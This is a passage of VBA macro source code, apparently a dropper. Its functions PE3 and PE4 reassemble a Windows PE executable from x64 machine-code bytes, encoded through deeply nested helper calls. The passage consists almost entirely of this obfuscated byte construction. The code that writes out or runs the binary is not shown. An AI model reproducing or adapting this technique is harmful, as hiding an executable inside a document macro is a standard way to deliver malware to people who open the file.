    strPE = A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "H"), 141), "L$-L"), 141), "\$,A"), 131), 225), " 1"), 210), "A"), 15), 182), 4), 18), 131), 224), 223), "D"), 9), 200), 136), 4), 17), "H"), 131), 194), 1), "H"), 131), 250), 3), "u"), 232), "H"), 141), "Q"), 3), "L"), 137), 217), "L)"), 218)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 232), "-"), 254), 255), 255), 144), "H"), 131), 196), "8"), 195), 15), 31), 128), 0), 0), 0), 0), "A"), 247), 193), 0), 1), 0), 0), "t"), 23), 198), "D$,+H"), 141), "L$-L"), 141), "\$,"), 235), 172), "f"), 15), 31), "D"), 0), 0)
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "A"), 246), 193), "@t"), 26), 198), "D$, H"), 141), "L$-L"), 141), "\$,"), 235), 143), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 141), "\$,L"), 137), 217), 233), "y"), 255), 255), 255), 15), 31), 0), "UA")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(strPE, "WAVAUATWVSH"), 131), 236), "8H"), 141), 172), "$"), 128), 0), 0), 0), "A"), 137), 206), "L"), 137), 195), 131), 249), "o"), 15), 132), "9"), 3), 0), 0), "E"), 139), "x"), 16), 184), 0), 0), 0), 0), "A"), 139), "x"), 8)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "E"), 133), 255), "A"), 15), "I"), 199), 131), 192), 18), 247), 199), 0), 16), 0), 0), 15), 133), 198), 1), 0), 0), "D"), 139), "k"), 12), "D9"), 232), "A"), 15), "L"), 197), "H"), 152), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), 252), 249), 255), 255), 185), 4)
    strPE = B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 0), "A"), 184), 15), 0), 0), 0), "H)"), 196), "L"), 141), "d$ L"), 137), 230), "H"), 133), 210), 15), 132), 245), 1), 0), 0), "E"), 137), 241), "A"), 131), 225), " f"), 15), 31), "D"), 0), 0), "D"), 137), 192), "H"), 131), 198), 1), "!")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 208), "D"), 141), "P0"), 131), 192), "7D"), 9), 200), "E"), 137), 211), "A"), 128), 250), ":A"), 15), "B"), 195), "H"), 211), 234), 136), "F"), 255), "H"), 133), 210), "u"), 215), "L9"), 230), 15), 132), 182), 1), 0), 0), "E"), 133), 255), 15), 142), 197), 1), 0)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(strPE, 0), "H"), 137), 240), "E"), 137), 248), "L)"), 224), "A)"), 192), "E"), 133), 192), 15), 142), 176), 1), 0), 0), "Ic"), 248), "H"), 137), 241), 186), "0"), 0), 0), 0), "I"), 137), 248), "H"), 1), 254), 232), 242), "G"), 0), 0), "L9"), 230), 15), 132), 173)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 1), 0), 0), "H"), 137), 240), "L)"), 224), "D9"), 232), 15), 140), 186), 1), 0), 0), 199), "C"), 12), 255), 255), 255), 255), "A"), 131), 254), "o"), 15), 132), "!"), 2), 0), 0), "A"), 189), 255), 255), 255), 255), 246), "C"), 9), 8), 15), 133), "Q"), 3), 0)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 0), "I9"), 244), 15), 131), 191), 0), 0), 0), 139), "{"), 8), "E"), 141), "u"), 255), 235), 31), 15), 31), 128), 0), 0), 0), 0), "HcC$"), 136), 12), 2), 139), "C$"), 131), 192), 1), 137), "C$L9"), 230), "v8"), 139), "{"), 8)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "H"), 131), 238), 1), 247), 199), 0), "@"), 0), 0), "u"), 8), 139), "C$9C(~"), 222), 129), 231), 0), " "), 0), 0), 15), 190), 14), "H"), 139), 19), "t"), 198), 232), 145), "G"), 0), 0), 139), "C$"), 131), 192), 1), 137), "C$L9")
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 230), "w"), 200), "E"), 133), 237), 127), "#"), 235), "["), 15), 31), "@"), 0), "HcC$"), 198), 4), 2), " "), 139), "C$"), 131), 192), 1), 137), "C$A"), 141), "F"), 255), "E"), 133), 246), "~=A"), 137), 198), 139), "{"), 8), 247), 199), 0), "@")
    strPE = A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 0), 0), "u"), 8), 139), "C$9C(~"), 219), 129), 231), 0), " "), 0), 0), "H"), 139), 19), "t"), 197), 185), " "), 0), 0), 0), 232), "3G"), 0), 0), 139), "C$"), 131), 192), 1), 137), "C$A"), 141), "F"), 255), "E"), 133), 246), 127)
    strPE = A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 195), "H"), 141), "e"), 184), "[^_A\A]A^A_]"), 195), 15), 31), 132), 0), 0), 0), 0), 0), "fA"), 131), "x "), 0), 185), 4), 0), 0), 0), 15), 132), "/"), 2), 0), 0), "A"), 137), 192), "A"), 185), 171), 170)

    PE3 = strPE
End Function

Private Function PE4() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 170), 170), "D"), 139), "k"), 12), "M"), 15), 175), 193), "I"), 193), 232), "!D"), 1), 192), "D9"), 232), "A"), 15), "L"), 197), "H"), 152), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), 17), 248), 255), 255), "H)"), 196), "L"), 141), "d$ A"), 131), 254)
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(strPE, "o"), 15), 132), "I"), 1), 0), 0), "A"), 184), 15), 0), 0), 0), "L"), 137), 230), "H"), 133), 210), 15), 133), 16), 254), 255), 255), 15), 31), "D"), 0), 0), 129), 231), 255), 247), 255), 255), 137), "{"), 8), "E"), 133), 255), 15), 143), "A"), 254), 255), 255), "f"), 15)
    strPE = A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "A"), 131), 254), "o"), 15), 132), 30), 1), 0), 0), "L9"), 230), 15), 133), "\"), 254), 255), 255), "E"), 133), 255), 15), 132), "S"), 254), 255), 255), 198), 6), "0H"), 131), 198), 1), "H"), 137), 240), "L)"), 224), "D9"), 232), 15), 141)
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "L"), 254), 255), 255), "f"), 15), 31), "D"), 0), 0), "A)"), 197), 139), "{"), 8), "D"), 137), "k"), 12), "A"), 131), 254), "o"), 15), 132), 244), 0), 0), 0), 247), 199), 0), 8), 0), 0), 15), 132), 24), 1), 0), 0), "A"), 131), 237), 2), "E"), 133), 237), "~")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 9), "E"), 133), 255), 15), 136), 246), 1), 0), 0), "D"), 136), "6H"), 131), 198), 2), 198), "F"), 255), "0E"), 133), 237), 15), 142), "!"), 254), 255), 255), 139), "{"), 8), "E"), 141), "u"), 255), 247), 199), 0), 4), 0), 0), 15), 133), 248), 0), 0), 0), 15)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 31), 128), 0), 0), 0), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), 219), 248), 255), 255), "D"), 137), 240), "A"), 131), 238), 1), 133), 192), 127), 232), "A"), 190), 254), 255), 255), 255), "A"), 189), 255), 255), 255), 255), "L9"), 230), 15), 135), 8), 254), 255)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 255), 233), 157), 254), 255), 255), "f"), 15), 31), "D"), 0), 0), "E"), 139), "x"), 16), 184), 0), 0), 0), 0), "A"), 139), "x"), 8), "E"), 133), 255), "A"), 15), "I"), 199), 131), 192), 24), 247), 199), 0), 16), 0), 0), 15), 133), 173), 0), 0), 0), "D"), 139), "k")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(strPE, 12), "A9"), 197), "A"), 15), "M"), 197), "H"), 152), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), 195), 246), 255), 255), 185), 3), 0), 0), 0), "H)"), 196), "L"), 141), "d$ A"), 184), 7), 0), 0), 0), 233), 194), 252), 255), 255), 15), 31), 0)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 246), "C"), 9), 8), 15), 132), 216), 254), 255), 255), 198), 6), "0H"), 131), 198), 1), 233), 204), 254), 255), 255), "f"), 144), "E"), 133), 255), 15), 136), 183), 0), 0), 0), "E"), 141), "u"), 255), 247), 199), 0), 4), 0), 0), 15), 132), "?"), 255), 255), 255), "L")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "9"), 230), 15), 135), "n"), 253), 255), 255), 233), 201), 253), 255), 255), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "E"), 133), 255), 15), 136), 231), 0), 0), 0), "E"), 141), "u"), 255), 247), 199), 0), 4), 0), 0), 15), 132), 15), 255), 255), 255), "I9"), 244)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 15), 130), ">"), 253), 255), 255), 233), 153), 253), 255), 255), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "fA"), 131), "x "), 0), 15), 132), 211), 0), 0), 0), 185), 3), 0), 0), 0), 233), 219), 253), 255), 255), "f."), 15), 31), 132), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 0), 0), "D"), 139), "k"), 12), "D9"), 232), "A"), 15), "L"), 197), "H"), 152), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), 246), 245), 255), 255), "A"), 184), 15), 0), 0), 0), "H)"), 196), "L"), 141), "d$ "), 233), 234), 253), 255), 255), 15), 31), 0)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "D"), 136), "6H"), 131), 198), 2), 198), "F"), 255), "0"), 233), 159), 252), 255), 255), 137), 248), "%"), 0), 6), 0), 0), "="), 0), 2), 0), 0), 15), 133), "7"), 255), 255), 255), "E"), 141), "M"), 255), "H"), 137), 241), 186), "0"), 0), 0), 0), "E"), 141), "y"), 1)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "D"), 137), "M"), 172), "Mc"), 255), "M"), 137), 248), "L"), 1), 254), 232), "$D"), 0), 0), "D"), 139), "M"), 172), "E)"), 233), "E"), 137), 205), "A"), 131), 254), "o"), 15), 132), "-"), 254), 255), 255), 129), 231), 0), 8), 0), 0), 15), 132), "!"), 254), 255), 255)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 233), 17), 254), 255), 255), 15), 31), 128), 0), 0), 0), 0), 137), 248), "%"), 0), 6), 0), 0), "="), 0), 2), 0), 0), "t"), 164), 247), 199), 0), 8), 0), 0), 15), 133), 240), 253), 255), 255), 233), 250), 254), 255), 255), "D"), 139), "k"), 12), "D9"), 232)
    strPE = B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(strPE, "A"), 15), "L"), 197), 233), "o"), 254), 255), 255), 144), "UAWAVAUATWVSH"), 131), 236), "(H"), 141), 172), "$"), 128), 0), 0), 0), 184), 0), 0), 0), 0), "D"), 139), "r"), 16), 139), "z"), 8), "E"), 133), 246), "A")
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 15), "I"), 198), "H"), 137), 211), 131), 192), 23), 247), 199), 0), 16), 0), 0), "t"), 11), "f"), 131), "z "), 0), 15), 133), "<"), 2), 0), 0), 139), "s"), 12), "9"), 198), 15), "M"), 198), "H"), 152), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), 229), 244), 255)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(strPE, 255), "H)"), 196), "L"), 141), "d$ @"), 246), 199), 128), "t"), 16), "H"), 133), 201), 15), 136), "N"), 2), 0), 0), "@"), 128), 231), 127), 137), "{"), 8), "H"), 133), 201), 15), 132), 22), 3), 0), 0), "I"), 187), 3), 0), 0), 0), 0), 0), 0), 128)
    strPE = B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "A"), 137), 250), "M"), 137), 224), "I"), 185), 205), 204), 204), 204), 204), 204), 204), 204), "A"), 129), 226), 0), 16), 0), 0), 15), 31), "D"), 0), 0), "M"), 141), "h"), 1), "M9"), 196), "t/E"), 133), 210), "t*f"), 131), "{ "), 0), "t#L")
    strPE = B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 137), 192), "L)"), 224), "L!"), 216), "H"), 131), 248), 3), "u"), 20), "I"), 141), "@"), 2), "A"), 198), 0), ",M"), 137), 232), "I"), 137), 197), "f"), 15), 31), "D"), 0), 0), "H"), 137), 200), "I"), 247), 225), "H"), 137), 200), "H"), 193), 234), 3), "L"), 141), "<")
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(strPE, 146), "M"), 1), 255), "L)"), 248), 131), 192), "0A"), 136), 0), "H"), 131), 249), 9), "v"), 13), "H"), 137), 209), "M"), 137), 232), 235), 157), 15), 31), "D"), 0), 0), "E"), 133), 246), 15), 142), 183), 1), 0), 0), "L"), 137), 232), "E"), 137), 240), "L)"), 224)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(strPE, "A)"), 192), "E"), 133), 192), "~"), 22), "Mc"), 248), "L"), 137), 233), 186), "0"), 0), 0), 0), "M"), 137), 248), "M"), 1), 253), 232), 136), "B"), 0), 0), "M9"), 236), 15), 132), 159), 1), 0), 0), 133), 246), "~3L"), 137), 232), "L)"), 224), ")")
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 198), 137), "s"), 12), 133), 246), "~$"), 247), 199), 192), 1), 0), 0), 15), 133), 152), 1), 0), 0), "E"), 133), 246), 15), 136), 158), 1), 0), 0), 247), 199), 0), 4), 0), 0), 15), 132), 219), 1), 0), 0), 15), 31), 0), "@"), 246), 199), 128), 15), 132)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 214), 0), 0), 0), "A"), 198), "E"), 0), "-I"), 141), "u"), 1), "I9"), 244), "r "), 235), "Sf"), 15), 31), "D"), 0), 0), "HcC$"), 136), 12), 2), 139), "C$"), 131), 192), 1), 137), "C$I9"), 244), "t8"), 139), "{"), 8)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "H"), 131), 238), 1), 247), 199), 0), "@"), 0), 0), "u"), 8), 139), "C$9C(~"), 222), 129), 231), 0), " "), 0), 0), 15), 190), 14), "H"), 139), 19), "t"), 198), 232), 25), "B"), 0), 0), 139), "C$"), 131), 192), 1), 137), "C$I9")
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(strPE, 244), "u"), 200), 139), "C"), 12), 235), 26), "f"), 15), 31), "D"), 0), 0), "HcC$"), 198), 4), 2), " "), 139), "S$"), 139), "C"), 12), 131), 194), 1), 137), "S$"), 137), 194), 131), 232), 1), 137), "C"), 12), 133), 210), "~0"), 139), "K"), 8), 246)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(strPE, 197), "@u"), 8), 139), "S$9S(~"), 222), "H"), 139), 19), 128), 229), " t"), 200), 185), " "), 0), 0), 0), 232), 190), "A"), 0), 0), 139), "S$"), 139), "C"), 12), 235), 196), "f"), 15), 31), "D"), 0), 0), "H"), 141), "e"), 168), "[^")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "_A\A]A^A_]"), 195), 15), 31), 128), 0), 0), 0), 0), 247), 199), 0), 1), 0), 0), "t8A"), 198), "E"), 0), "+I"), 141), "u"), 1), 233), 29), 255), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 137), 194), "A"), 184), 171), 170), 170), 170), "I"), 15), 175), 208), "H"), 193), 234), "!"), 1), 208), 233), 173), 253), 255), 255), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 238), "@"), 246), 199), "@"), 15), 132), 230), 254), 255), 255), "A"), 198), "E"), 0), " ")
    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "H"), 131), 198), 1), 233), 216), 254), 255), 255), 15), 31), "D"), 0), 0), "H"), 247), 217), 233), 186), 253), 255), 255), 15), 31), 132), 0), 0), 0), 0), 0), "M9"), 236), 15), 133), "p"), 254), 255), 255), "E"), 133), 246), 15), 132), "g"), 254), 255), 255), "f"), 15)
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "A"), 198), "E"), 0), "0I"), 131), 197), 1), 233), "S"), 254), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0), 131), 238), 1), 137), "s"), 12), "E"), 133), 246), 15), 137), "b"), 254), 255), 255), 137), 248), "%"), 0), 6), 0), 0)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "="), 0), 2), 0), 0), 15), 133), "P"), 254), 255), 255), 139), "S"), 12), 141), "B"), 255), 137), "C"), 12), 133), 210), 15), 142), "N"), 254), 255), 255), "H"), 141), "p"), 1), "L"), 137), 233), 186), "0"), 0), 0), 0), "I"), 137), 240), "I"), 1), 245), 232), 127), "@"), 0)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 0), 199), "C"), 12), 255), 255), 255), 255), 233), "+"), 254), 255), 255), 15), 31), 0), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 15), 142), 23), 254), 255), 255), 15), 31), 128), 0), 0), 0), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), "s")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 243), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 127), 230), 139), "{"), 8), 233), 238), 253), 255), 255), "f"), 15), 31), "D"), 0), 0), "M"), 137), 229), "E"), 137), 240), "E"), 133), 246), 15), 143), 131), 253), 255), 255), 233), "-"), 255), 255), 255)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 15), 31), "@"), 0), "UATWVSH"), 137), 229), "H"), 131), 236), "0"), 131), "y"), 20), 253), "I"), 137), 204), 15), 132), 230), 0), 0), 0), 15), 183), "Q"), 24), "f"), 133), 210), 15), 132), 185), 0), 0), 0), "IcD$"), 20), "H"), 137)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 230), "H"), 131), 192), 15), "H"), 131), 224), 240), 232), "T"), 241), 255), 255), "H)"), 196), "L"), 141), "E"), 248), "H"), 199), "E"), 248), 0), 0), 0), 0), "H"), 141), "\$ H"), 137), 217), 232), "XD"), 0), 0), 133), 192), 15), 142), 224), 0), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(strPE, 131), 232), 1), "H"), 141), "|"), 3), 1), 235), "!f"), 15), 31), "D"), 0), 0), "IcD$$A"), 136), 12), 0), "A"), 139), "D$$"), 131), 192), 1), "A"), 137), "D$$H9"), 223), "tAA"), 139), "T$"), 8), "H"), 131)
    strPE = A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(strPE, 195), 1), 246), 198), "@u"), 12), "A"), 139), "D$$A9D$(~"), 217), 15), 190), "K"), 255), "M"), 139), 4), "$"), 128), 230), " t"), 190), "L"), 137), 194), 232), 142), "?"), 0), 0), "A"), 139), "D$$"), 131), 192), 1), "A"), 137)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(strPE, "D$$H9"), 223), "u"), 191), "H"), 137), 244), "H"), 137), 236), "[^_A\]"), 195), 15), 31), 128), 0), 0), 0), 0), "L"), 137), 226), 185), "."), 0), 0), 0), 232), "S"), 242), 255), 255), 144), "H"), 137), 236), "[^_A\")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "]"), 195), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 199), "E"), 248), 0), 0), 0), 0), "H"), 141), "]"), 248), 232), 31), "?"), 0), 0), "H"), 141), "M"), 246), "I"), 137), 217), "A"), 184), 16), 0), 0), 0), "H"), 139), 16), 232), 26), "A"), 0), 0), 133), 192)
    strPE = A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, "~."), 15), 183), "U"), 246), "fA"), 137), "T$"), 24), "A"), 137), "D$"), 20), 233), 224), 254), 255), 255), "f"), 144), "L"), 137), 226), 185), "."), 0), 0), 0), 232), 243), 241), 255), 255), "H"), 137), 244), 233), "z"), 255), 255), 255), 15), 31), 0), "A"), 15)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 183), "T$"), 24), 235), 212), "UWVSH"), 131), 236), "(A"), 139), "A"), 12), 137), 205), "H"), 137), 215), "D"), 137), 198), "L"), 137), 203), "E"), 133), 192), 15), 142), 16), 2), 0), 0), "A9"), 192), 15), 142), 247), 0), 0), 0), 199), "C"), 12)
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 255), 255), 184), 255), 255), 255), 255), 246), "C"), 9), 16), "tMf"), 131), "{ "), 0), 15), 132), 10), 1), 0), 0), 186), 171), 170), 170), 170), "D"), 141), "F"), 2), "L"), 15), 175), 194), 137), 194), "I"), 193), 232), "!A"), 141), "H"), 255), ")")
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 193), "A"), 131), 248), 1), "u"), 27), 233), 230), 0), 0), 0), "f"), 15), 31), "D"), 0), 0), 131), 234), 1), 137), 200), 1), 208), 137), "S"), 12), 15), 132), "*"), 3), 0), 0), 133), 210), 127), 236), 15), 31), "@"), 0), 133), 237), 15), 133), 34), 1), 0), 0)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 139), "S"), 8), 246), 198), 1), 15), 133), 132), 2), 0), 0), 131), 226), "@"), 15), 133), 243), 2), 0), 0), 139), "C"), 12), 133), 192), "~"), 21), 139), "S"), 8), 129), 226), 0), 6), 0), 0), 129), 250), 0), 2), 0), 0), 15), 132), "w"), 2), 0), 0), "H")
